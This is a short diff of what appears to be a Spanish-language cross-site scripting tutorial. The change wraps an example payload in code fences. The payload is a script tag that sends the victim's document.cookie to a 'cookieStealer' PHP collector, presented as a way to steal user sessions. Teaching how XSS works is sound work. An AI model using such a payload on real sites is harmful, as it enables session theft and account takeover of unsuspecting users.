@@ -79,7 +79,9 @@ Podríamos redirigir a una página de phishing:
 ---
 Con esto, un atacante podría robar sesiones de usuarios.
 
+~~~
 <script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
+~~~
 
 ![](images/xss4.png)
 
